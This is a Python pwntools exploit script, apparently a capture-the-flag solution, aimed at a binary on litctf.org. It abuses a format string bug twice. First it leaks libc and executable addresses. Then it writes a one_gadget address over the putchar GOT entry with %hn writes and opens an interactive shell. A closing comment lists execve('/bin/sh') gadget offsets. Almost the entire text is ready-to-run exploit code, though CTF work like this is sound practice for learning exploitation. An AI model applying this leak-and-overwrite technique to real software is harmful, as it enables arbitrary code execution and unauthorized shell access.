#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x124F

        c
        ''')
        input()


if args.REMOTE:
    p = remote('litctf.org', 31772)
else:
    p = process(exe.path)
GDB()
sla(b'Echo!\n', b'%41$p|%45$p|')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x24083
exe.address = int(p.recvuntil(b'|', drop=True), 16) - exe.sym.main
info("libc.address: " + hex(libc.address))
info("exe.address: " + hex(exe.address))

one_gadget = libc.address + 0xe3b01
package = {
    one_gadget >> 0 & 0xffff: exe.got.putchar,
    one_gadget >> 16 & 0xffff: exe.got.putchar+2,
    one_gadget >> 32 & 0xffff: exe.got.putchar+4,
}
order = sorted(package)
pa = f"%{order[0]}c%12$hn".encode()
pa += f"%{order[1] - order[0]}c%13$hn".encode()
pa += f"%{order[2] - order[1]}c%14$hn".encode()
pa = pa.ljust(0x30)
pa += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]],
)
sl(pa)
p.interactive()
"""
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""